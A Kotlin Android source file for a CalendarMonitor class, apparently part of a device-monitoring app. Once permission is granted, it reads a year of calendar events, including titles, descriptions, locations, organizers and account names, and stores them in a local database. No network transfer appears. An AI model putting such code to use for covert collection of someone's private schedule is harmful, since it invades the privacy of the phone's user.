package com.empresa.monitor.service.system

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.provider.CalendarContract
import androidx.core.content.ContextCompat
import com.empresa.monitor.data.db.MonitorDatabase
import com.empresa.monitor.data.db.entity.CalendarEntity
import kotlinx.coroutines.*

class CalendarMonitor(private val context: Context) {

    private val db = MonitorDatabase.getInstance(context)
    private val calendarDao = db.calendarDao()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isRunning = false

    fun startMonitoring() {
        if (isRunning) return
        isRunning = true

        if (!hasCalendarPermission()) return

        scope.launch {
            captureAllEvents()
        }
    }

    fun stopMonitoring() {
        isRunning = false
        scope.cancel()
    }

    private fun hasCalendarPermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALENDAR) ==
                PackageManager.PERMISSION_GRANTED
    }

    @SuppressLint("Range")
    private suspend fun captureAllEvents() {
        withContext(Dispatchers.IO) {
            try {
                val projection = arrayOf(
                    CalendarContract.Events._ID,
                    CalendarContract.Events.TITLE,
                    CalendarContract.Events.DESCRIPTION,
                    CalendarContract.Events.EVENT_LOCATION,
                    CalendarContract.Events.DTSTART,
                    CalendarContract.Events.DTEND,
                    CalendarContract.Events.ALL_DAY,
                    CalendarContract.Events.DURATION,
                    CalendarContract.Events.RRULE,
                    CalendarContract.Events.ORGANIZER,
                    CalendarContract.Events.STATUS,
                    CalendarContract.Calendars.NAME,
                    CalendarContract.Calendars.ACCOUNT_NAME
                )

                val cursor = context.contentResolver.query(
                    CalendarContract.Events.CONTENT_URI,
                    projection,
                    "${CalendarContract.Events.DTSTART} > ?",
                    arrayOf((System.currentTimeMillis() - 365L * 24 * 60 * 60 * 1000).toString()),
                    "${CalendarContract.Events.DTSTART} ASC"
                )

                cursor?.use {
                    val events = mutableListOf<CalendarEntity>()
                    while (it.moveToNext()) {
                        val eventId = it.getLong(0)
                        val title = it.getString(1)
                        val description = it.getString(2)
                        val location = it.getString(3)
                        val startTime = it.getLong(4)
                        val endTime = it.getLong(5)
                        val allDay = it.getInt(6) == 1
                        val duration = it.getString(7)
                        val rrule = it.getString(8)
                        val organizer = it.getString(9)
                        val status = it.getInt(10)
                        val calendarName = it.getString(11)
                        val accountName = it.getString(12)

                        events.add(
                            CalendarEntity(
                                eventId = eventId,
                                title = title,
                                description = description,
                                eventLocation = location,
                                startTime = startTime,
                                endTime = endTime,
                                allDay = allDay,
                                duration = duration,
                                rrule = rrule,
                                organizer = organizer,
                                status = if (status >= 0) status else null,
                                calendarName = calendarName,
                                accountName = accountName
                            )
                        )
                    }
                    calendarDao.insertAll(events)
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    fun destroy() {
        stopMonitoring()
    }
}
